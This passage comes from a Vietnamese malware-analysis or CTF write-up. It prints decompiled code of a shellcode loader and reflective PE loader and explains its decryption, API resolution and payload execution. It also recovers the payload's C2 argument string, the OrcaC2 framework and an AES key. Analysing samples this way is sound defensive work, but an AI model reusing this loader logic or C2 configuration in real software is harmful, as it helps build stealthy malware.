  return v7;
}
```

Hàm thực hiện dựa trên điều kiện `if`, khi debug thì biết được nó sẽ thực hiện `main_exec` luôn

```c
int __cdecl main_exec(int *a1)
{
  int (__stdcall *v2)(_DWORD, _DWORD, _DWORD, _DWORD); // ebp
  void (__stdcall *v3)(char *, _DWORD, int); // edi
  void (__stdcall *v4)(_DWORD); // eax
  void (__stdcall *v5)(_DWORD); // ebx
  char *v6; // eax
  char *v7; // edi
  int v9; // edx
  int v10; // eax
  _BYTE *v11; // esi
  char v12; // cl
  unsigned int v13; // eax
  _BYTE *v14; // edx
  unsigned int v15; // ebx
  _DWORD *v16; // ebp
  _DWORD *v17; // esi
  int v18; // eax
  int v19; // eax
  _DWORD *v20; // esi
  _BYTE *v21; // eax
  _DWORD *v22; // ebx
  int v23; // eax
  int v24; // eax
  void *v25; // eax
  void (__stdcall *v26)(char *, _DWORD, int); // ebp
  int v27; // esi
  void (__stdcall *v28)(_DWORD); // [esp+44h] [ebp-13Ch]
  void (__stdcall *v29)(char *, _DWORD, int); // [esp+48h] [ebp-138h]
  int (__stdcall *v30)(_DWORD, _DWORD, _DWORD, _DWORD); // [esp+4Ch] [ebp-134h]
  char v31[4]; // [esp+50h] [ebp-130h] BYREF
  char v32[4]; // [esp+54h] [ebp-12Ch] BYREF
  char v33[4]; // [esp+58h] [ebp-128h] BYREF
  _BYTE buf[32]; // [esp+5Ch] [ebp-124h] BYREF
  _BYTE v35[260]; // [esp+7Ch] [ebp-104h] BYREF

  v2 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))fn_resolve_api(a1, a1[18], a1[19], a1[10], a1[11]);
  v30 = v2;
  v3 = (void (__stdcall *)(char *, _DWORD, int))fn_resolve_api(a1, a1[20], a1[21], a1[10], a1[11]);
  v29 = v3;
  v4 = (void (__stdcall *)(_DWORD))fn_resolve_api(a1, a1[102], a1[103], a1[10], a1[11]);
  v5 = v4;
  v28 = v4;
  if ( !v2 || !v3 || !v4 )
    return -1;
  v6 = (char *)v2(0, *a1, 12288, 4);
  v7 = v6;
  if ( !v6 )
  {
    if ( a1[140] == 2 )
      v5(0);
    return -1;
  }
  fn_memcpy_custom(v6, (int)a1, *a1);
  memset(buf, 0, sizeof(buf));
  if ( *((_DWORD *)v7 + 141) != 3
    || (fn_chacha_encrypt_block(v7 + 4, v7 + 20, v7 + 576, *(_DWORD *)v7 - 576),
        fn_custom_hash(v7 + 2032, *((_DWORD *)v7 + 10), *((_DWORD *)v7 + 11)) == *((_DWORD *)v7 + 572))
    && v9 == *((_DWORD *)v7 + 573) )
  {
    v10 = fn_resolve_api(v7, *((_DWORD *)v7 + 12), *((_DWORD *)v7 + 13), *((_DWORD *)v7 + 10), *((_DWORD *)v7 + 11));
    *((_DWORD *)v7 + 12) = v10;
    if ( !v10 )
      return -1;
    v11 = v7 + 580;
    while ( 1 )
    {
      v12 = *v11;
      v13 = 0;
      if ( !*v11 )
        break;
      v14 = v11;
      do
      {
        if ( v12 == 59 )
          break;
        if ( v13 >= 0x104 )
          break;
        v14[v35 - v11] = v12;
        ++v13;
        v12 = *++v14;
      }
      while ( *v14 );
      if ( !v13 )
        break;
      v35[v13] = 0;
      v11 += v13 + 1;
      (*((void (__stdcall **)(_BYTE *))v7 + 12))(v35);
    }
    v15 = 1;
    if ( *((_DWORD *)v7 + 144) > 1u )
    {
      v16 = v7 + 52;
      v17 = v7 + 56;
      while ( 1 )
      {
        v18 = fn_resolve_api(v7, *v17, v17[1], *((_DWORD *)v7 + 10), *((_DWORD *)v7 + 11));
        *v16 = v18;
        if ( !v18 )
          goto LABEL_57;
        ++v15;
        v17 += 2;
        ++v16;
        if ( v15 >= *((_DWORD *)v7 + 144) )
        {
          v2 = v30;
          break;
        }
      }
    }
    v19 = *((_DWORD *)v7 + 441);
    if ( v19 == 2 )
    {
      if ( !sub_189EAE9((int)v2, (int)v7) )
        goto LABEL_57;
      v20 = (_DWORD *)*((_DWORD *)v7 + 584);
    }
    else
    {
      if ( v19 == 3 )
        goto LABEL_57;
      v20 = v7 + 2336;
      if ( v19 != 1 )
        v20 = v30;
    }
    if ( *((_DWORD *)v7 + 347) == 1
      || (sub_189E91D(v7) || *((_DWORD *)v7 + 347) != 2) && (sub_189EA03(v7) || *((_DWORD *)v7 + 347) != 2) )
    {
      if ( v20[2] == 1 )
        goto LABEL_46;
      v21 = (_BYTE *)v2(0, v20[329] + 1328, 12288, 4);
      v22 = v21;
      if ( v21 )
      {
        fn_memcpy_custom(v21, (int)v20, 1328);
        v23 = v20[2];
        if ( v23 != 3 && v23 != 4 && v23 != 5 )
        {
          if ( v23 == 2 )
          {
            sub_18A07B9(v20 + 330, v22 + 330);
LABEL_45:
            v20 = v22;
          }
LABEL_46:
          switch ( *v20 )
          {
            case 3:
            case 4:
              fn_load_and_execute_pe((int)v7, (int)v20);
              break;
            case 1:
            case 2:
              if ( sub_189F3E6(v7, v20, buf) )
                sub_189F9AB(v7, v20, buf);
              sub_189EEBE(v7, buf);
              break;
            case 5:
            case 6:
              sub_18A012A(v7, v20);
              break;
          }
          goto LABEL_57;
        }
        if ( !(*((int (__stdcall **)(int, char *, char *))v7 + 59))(
                (unsigned __int16)(*((_WORD *)v20 + 4) - 1) | 0x100,
                v32,
                v31)
          && !(*((int (__stdcall **)(int, _DWORD *, _DWORD, _DWORD *, _DWORD, char *))v7 + 60))(
                (unsigned __int16)(*((_WORD *)v20 + 4) - 1) | 0x100,
                v22 + 330,
                v20[329],
                v20 + 330,
                v20[328],
                v33) )
        {
          goto LABEL_45;
        }
      }
    }
LABEL_57:
    v5 = v28;
  }
  v24 = *((_DWORD *)v7 + 441);
  if ( (v24 == 2 || v24 == 3) && (v25 = (void *)*((_DWORD *)v7 + 584)) != 0 )
  {
    memset(v25, 0, *((_DWORD *)v7 + 582));
    v26 = v29;
    v29(*((char **)v7 + 584), 0, 49152);
    *((_DWORD *)v7 + 584) = 0;
  }
  else
  {
    v26 = v29;
  }
  v27 = *((_DWORD *)v7 + 140);
  memset(v7, 0, *(_DWORD *)v7);
  v26(v7, 0, 49152);
  if ( v27 == 2 )
    v5(0);
  return 0;
}
```

`main_exec` có xuất hiện một vài hàm `resolve api` động, ta có thể đặt breakpoint đằng sau chúng để biết đang tìm api nào

Rồi sau đó gọi `fn_memcpy_custom` để load phần `.text` tức là nội dung của shellcode vào

- Lần đầu là để copy header
- Lần thứ 2 là để copy 6 section vào dưới phần header

Tiếp theo chương trình thực hiện kiểm tra cấu trúc của file đang chạy nếu là 32bit thì mới thực hiện hàm `fn_load_and_execute_pe` 

```c
_DWORD *__cdecl fn_load_and_execute_pe(int a1, int a2)
{
  int v2; // ebx
  int v3; // edi
  _DWORD *result; // eax
  _DWORD *v5; // esi
  unsigned int v6; // ebx
  _DWORD *v7; // ebp
  int v8; // eax
  unsigned __int16 *v9; // ebp
  unsigned __int16 *i; // ecx
  unsigned __int16 v11; // dx
  int v12; // eax
  _DWORD *v13; // ebp
  int v14; // eax
  int v15; // ecx
  bool v16; // sf
  int *v17; // ebp
  char *v18; // eax
  int v19; // eax
  int v20; // eax
  _DWORD *v21; // ebp
  int v22; // eax
  int v23; // eax
  int *v24; // edi
  _DWORD *v25; // ebp
  int v26; // ebp
  void (__stdcall **v27)(_DWORD *, int, _DWORD); // ebp
  void (__stdcall *v28)(_DWORD); // ebp
  int v29; // edx
  int v30; // ecx
  int v31; // ebp
  _DWORD *v32; // eax
  int v33; // ecx
  _BYTE *v34; // eax
  int v35; // eax
  char *v36; // [esp+44h] [ebp-220h]
  _DWORD *v37; // [esp+44h] [ebp-220h]
  int v38; // [esp+44h] [ebp-220h]
  char *v39; // [esp+44h] [ebp-220h]
  int v40; // [esp+48h] [ebp-21Ch]
  _DWORD *v41; // [esp+48h] [ebp-21Ch]
  char *v42; // [esp+48h] [ebp-21Ch]
  char *v43; // [esp+4Ch] [ebp-218h]
  int *v44; // [esp+50h] [ebp-214h]
  int v45; // [esp+54h] [ebp-210h]
  _DWORD *v46; // [esp+54h] [ebp-210h]
  void (*v47)(void); // [esp+58h] [ebp-20Ch]
  void *buf; // [esp+5Ch] [ebp-208h]
  _BYTE v49[516]; // [esp+60h] [ebp-204h] BYREF

  v2 = a1;
  v47 = 0;
  buf = (void *)(a2 + 1320);
  v3 = a2 + 1320 + *(_DWORD *)(a2 + 1380);
  v45 = v3;
  result = (_DWORD *)(*(int (__stdcall **)(_DWORD))(a1 + 56))(0);
  if ( *(_WORD *)(v3 + 4) != *(_WORD *)((char *)result + result[15] + 4) )
    return result;
  result = (_DWORD *)(*(int (__stdcall **)(_DWORD, int, int, int))(a1 + 60))(0, *(_DWORD *)(v3 + 80) + 4096, 12288, 64);
  v5 = result;
  if ( !result )
    return result;
  fn_memcpy_custom(result, a2 + 1320, *(_DWORD *)(v3 + 84));
  if ( *(_WORD *)(v3 + 6) )
  {
    v6 = 0;
    v7 = (_DWORD *)(v3 + *(unsigned __int16 *)(v3 + 20) + 44);
    do
    {
      fn_memcpy_custom((_BYTE *)v5 + *(v7 - 2), (int)buf + *v7, *(v7 - 1));
      v7 += 10;
      ++v6;
    }
    while ( v6 < *(unsigned __int16 *)(v3 + 6) );
    v2 = a1;
  }
  v8 = *(_DWORD *)(v3 + 160);
  if ( v8 )
  {
    v9 = (unsigned __int16 *)((char *)v5 + v8);
    v36 = (char *)v5 - *(_DWORD *)(v3 + 52);
    if ( *(_DWORD *)((char *)v5 + v8) )
    {
      do
      {
        for ( i = v9 + 4; i != (unsigned __int16 *)((char *)v9 + *((_DWORD *)v9 + 1)); ++i )
        {
          v11 = *i;
          if ( (*i & 0xF000) == 0x3000 )
          {
            *(_DWORD *)((char *)v5 + *(_DWORD *)v9 + (v11 & 0xFFF)) += v36;
          }
          else if ( v11 >= 0x1000u )
          {
            return (_DWORD *)(*(int (__stdcall **)(_DWORD *, _DWORD, int))(v2 + 64))(v5, 0, 49152);
          }
        }
        v9 = i;
      }
      while ( *(_DWORD *)i );
    }
  }
  v12 = *(_DWORD *)(v3 + 128);
  if ( !v12 )
    goto LABEL_30;
  v13 = (_DWORD *)((char *)v5 + v12);
  v14 = *(_DWORD *)((char *)v5 + v12 + 12);
  v37 = v13;
  if ( !v14 )
    goto LABEL_30;
  do
  {
    v40 = (*(int (__stdcall **)(int))(v2 + 48))((int)v5 + v14);
    v44 = (_DWORD *)((char *)v5 + *v13);
    v15 = *v44;
    v16 = *v44 < 0;
    if ( !*v44 )
      goto LABEL_29;
    v17 = (_DWORD *)((char *)v5 + v13[4]);
    do
    {
      if ( v16 )
      {
        v18 = (char *)(unsigned __int16)v15;
      }
      else
      {
        v18 = (char *)v5 + v15 + 2;
        v43 = v18;
        if ( *(_DWORD *)(a2 + 4) )
        {
          if ( sub_189F344(v2, (char *)v5 + v15 + 2) )
          {
            v19 = *(_DWORD *)(v2 + 224);
            goto LABEL_27;
          }
          v18 = v43;
        }
      }
      v19 = (*(int (__stdcall **)(int, char *))(v2 + 52))(v40, v18);
LABEL_27:
      *v17++ = v19;
      v15 = *++v44;
      v16 = *v44 < 0;
    }
    while ( *v44 );
    v13 = v37;
LABEL_29:
    v14 = v13[8];
    v13 += 5;
    v37 = v13;
  }
  while ( v14 );
LABEL_30:
  v20 = *(_DWORD *)(v3 + 224);
  if ( v20 )
  {
    v21 = (_DWORD *)((char *)v5 + v20 + 4);
    v41 = v21;
    v22 = *v21;
    if ( *v21 )
    {
      do
      {
        v38 = (*(int (__stdcall **)(int))(v2 + 48))((int)v5 + v22);
        if ( v38 )
        {
          v23 = *(_DWORD *)((char *)v5 + v21[3]);
          if ( v23 )
          {
            v24 = (_DWORD *)((char *)v5 + v21[3]);
            v25 = (_DWORD *)((char *)v5 + v21[2]);
            do
            {
              if ( v23 >= 0 )
                v23 += (int)v5 + 2;
              else
                v23 = (unsigned __int16)v23;
              ++v24;
              *v25++ = (*(int (__stdcall **)(int, int))(v2 + 52))(v38, v23);
              v23 = *v24;
            }
            while ( *v24 );
            v21 = v41;
          }
        }
        v21 += 8;
        v41 = v21;
        v22 = *v21;
      }
      while ( *v21 );
      v3 = v45;
    }
  }
  v26 = *(_DWORD *)(v3 + 192);
  if ( v26 )
  {
    v27 = *(void (__stdcall ***)(_DWORD *, int, _DWORD))((char *)v5 + v26 + 12);
    if ( v27 )
    {
      while ( *v27 )
        (*v27++)(v5, 1, 0);
    }
  }
  v28 = (void (__stdcall *)(_DWORD))((char *)v5 + *(_DWORD *)(v3 + 40));
  if ( *(_DWORD *)a2 == 3 )
  {
    ((void (__stdcall *)(_DWORD *, int, _DWORD))v28)(v5, 1, 0);
    v29 = a2 + 780;
    if ( *(_BYTE *)(a2 + 780) )
    {
      v30 = *(_DWORD *)(v3 + 120);
      if ( v30 )
      {
        v31 = *(_DWORD *)((char *)v5 + v30 + 24);
        if ( v31 )
        {
          v42 = (char *)v5 + *(_DWORD *)((char *)v5 + v30 + 28);
          v39 = (char *)v5 + *(_DWORD *)((char *)v5 + v30 + 36);
          v32 = (_DWORD *)((char *)&v5[v31 - 1] + *(_DWORD *)((char *)v5 + v30 + 32));
          v46 = v32;
          while ( sub_18A09EC((char *)v5 + *v32, v29) )
          {
            v32 = --v46;
            if ( !--v31 )
              goto LABEL_56;
            v29 = a2 + 780;
          }
          v47 = (void (*)(void))((char *)v5 + *(_DWORD *)&v42[4 * *(unsigned __int16 *)&v39[2 * v31 - 2]]);
LABEL_56:
          memset(v5, 0, *(_DWORD *)(v3 + 84));
          memset(buf, 0, *(_DWORD *)(v3 + 84));
          if ( v47 )
          {
            if ( *(_BYTE *)(a2 + 1036) )
            {
              v33 = *(_DWORD *)(a2 + 1292);
              if ( v33 )
              {
                sub_18A0520(v2, a2 + 1036, (int)v49);
                v33 = *(_DWORD *)(a2 + 1292);
              }
              v34 = v49;
              if ( !v33 )
                v34 = (_BYTE *)(a2 + 1036);
              ((void (__stdcall *)(_BYTE *))v47)(v34);
            }
            else
            {
              v47();
            }
          }
        }
      }
    }
  }
  else
  {
    if ( *(_BYTE *)(a2 + 1036) )
    {
      sub_18A0520(v2, a2 + 1036, (int)v49);
      sub_18A02ED(v2, (int)v49);
    }
    memset(v5, 0, *(_DWORD *)(v3 + 84));
    memset(buf, 0, *(_DWORD *)(v3 + 84));
    if ( *(_DWORD *)(a2 + 4) )
    {
      v35 = (*(int (__stdcall **)(_DWORD, _DWORD, void (__stdcall *)(_DWORD), _DWORD, _DWORD, _DWORD))(v2 + 92))(
              0,
              0,
              v28,
              0,
              0,
              0);
      if ( v35 )
        (*(void (__stdcall **)(int, int))(v2 + 88))(v35, -1);
    }
    else
    {
      v28(NtCurrentTeb()->ProcessEnvironmentBlock);
    }
  }
  return (_DWORD *)(*(int (__stdcall **)(_DWORD *, _DWORD, int))(v2 + 64))(v5, 0, 49152);
}
```

Cuối cùng `fn_load_and_execute_pe` gọi 2 lần `fn_memcpy_custom` để copy payload tiếp theo vào vùng nhớ:

- Lần thứ nhất để copy header
- Lần 2 là để copy 6 section vào dưới header

> Ta có thể dump payload cuối cùng tại vùng nhớ đó sau khi đã copy hết

Rồi tuỳ theo payload là `dll` hay `exe` sẽ xử lí khác nhau, khi debug thì biết được payload này là `exe` nên chương trình sẽ gọi

`c
v28(NtCurrentTeb()->ProcessEnvironmentBlock);
`

Để chạy payload

Trước khi gọi `v28` thì chương trình có 1 lệnh ` if ( *(_BYTE *)(a2 + 1036) );` khi debug thì biết được đoạn này đang so sánh với 1 chuỗi 

```text
"pmseindw -host=192.168.57.119:6000 -key=pJB`-v)t^ZAsP$|r"
```

Khả năng đây là argument được đưa vào, đây cũng chính là key mà câu hỏi muốn ta tìm

Tiếp tục ta sẽ quay lại với payload cuối cùng, khi kiểm tra trong strings, user agent của request `GET` thì biết được framework C2 mà mã đọc sử dụng là `OrcaC2`, trìm trên google có [repo](https://github.com/Ptkatz/OrcaC2/blob/master/Orca_Master/main.go) đọc `main.go` thì biết được sử dụng mã hoá `AES`

```go
config.AesKey = retData.Data.(string)
```

> AES

> a524c43df3063c33cfd72e2bf1fd32f6

> OrcaC2